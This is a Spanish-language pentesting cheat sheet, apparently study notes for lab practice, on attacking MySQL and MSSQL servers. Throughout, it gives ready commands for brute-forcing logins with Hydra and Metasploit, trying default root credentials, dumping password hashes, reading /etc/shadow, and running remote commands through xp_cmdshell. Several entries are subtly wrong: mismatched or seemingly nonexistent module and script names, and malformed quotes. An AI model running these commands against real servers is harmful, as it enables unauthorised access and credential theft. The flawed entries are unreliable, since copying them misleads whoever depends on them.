# MySQL (3306)

Propietario: Adrian Gisbert Cabello

- Para entrar mediante el protocolo MySQL: `mysql -u USUARIO -p -h 192.168.X.X` ******→ usuarios ***por defecto suele ser root***, no suelen cambiar credenciales por defecto: `mysql -u root -h 192.168.X.X`

- Con la herramienta metasploit podemos usar los siguientes scripts:
    - Fuerza bruta: `use auxiliary/scanner/mssql/mssql_login`
    - Enumeración en mysql: `use auxiliary/admin/mssql/mssql_enum`
    - Dumpear hashes: `use auxiliary/scanner/mssql/mssql_hashdump`
    - Para saber que privilegios tienen los usuarios: `use auxiliary/admin/mssql/mssql_enum_sql_logins`
    - Para enumerar dominios: `use auxiliary/admin/mssql/mssql_enum_domain_accounts`
    - Ejecución remota de comandos (RCE) con credenciales: `use auxiliary/admin/mssql/mssql_enum_exec`
    - `set cmd whoami`
- Para hacer fuerza bruta con hydra: `hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt mysql://192.168.X.X`

- Cuando estamos dentro del MySQL estos son algunos de los comandos más importantes:
    - Para ver las bases de datos: `show databases`
    - Para seleccionar una base de datos: ***use <Nombre de la base de datos>*** = `use wordpress` → `show databases` → `select * from wp_users`

- Default Credentials = `root::en blanco` | `root::root`

- Comandos para usar con NMAP:
    - Para saber si podemos entrar sin contraseña: `nmap 192.168.X.X -sV -p 3306 --script=mysql-empty-password`
    - Para ver información: `nmap 192.168.X.X -sV -p 3306 --script=mysql-empty-info`
    - Para: `nmap 192.168.X.X -sV -p 3306 --script=mysql-users --script-args=¨mysqluser='root',mysqlpass=''¨`
    - Para ver bases de datos: `nmap 192.168.X.X -sV -p 3306 --script=mysql-databases --script-args=¨mysqluser='root',mysqlpass=''¨`
    - Para ver directorios: `nmap 192.168.X.X -sV -p 3306 --script=mysql-variables --script-args=¨mysqluser='root',mysqlpass=''¨`
    - Para ver un archivo: `nmap 192.168.X.X -sV -p 3306 --script=mysql-audit --script-args=¨mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'¨`
    - Para dumpear hashes: `nmap 192.168.X.X -sV -p 3306 --script=mysql-dump-hashes --script-args=¨username='root',password=''¨`
    - Para windows:
    - Info del sistema: `nmap 192.168.X.X -p 1433 --script ms-sql-info`
    - Info: `nmap 192.168.X.X -p 1433 --script ms-sql-ntlm-info --script-args msssql.instance-port=1433`
    - Fuerza bruta: `nmap 192.168.X.X -p 1433 --script ms-sql-brute --script-args userdb=/users.txt,passdb=/pass.txt`
    - Saber si podemos entrar sin contraseña: `nmap 192.168.X.X -p 1433 --script ms-sql-empty-password`
    - Dumpear toda la base de datos con credenciales: `nmap 192.168.X.X -p 1433 --script ms-sql-empty-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query=¨SELECT * FROM master..syslogins¨ -oN output.txt`
    - Dumpear hashes con unas credenciales: `nmap 192.168.X.X -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria`
    - Ejecución remota de comandos (RCE) con credenciales: `nmap 192.168.X.X -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd=¨COMANDO¨`
    - Leer un archivo: `nmap 192.168.X.X -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd=¨type c:**\**flag.txt¨`

- Comandos para usar dentro de MySQL:
    - `select load_file(¨/etc/shadow¨);`
    - `show databases`
    - `show tables`
    - `;`

- Escaners en Metasploit para MySQL:
    - Para ver directorios con permisos de escritura: `use auxiliary/scanner/mysql/mysql_writable_dirs`
        - `set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt`
        - `set verbose false`
        - `set password ''`
        - `run`
    - Para dumpear hashes: `use auxiliary/scanner/mysql/mysql_hashdump`
        - `set username root`
        - `set password ''`
        - `exploit`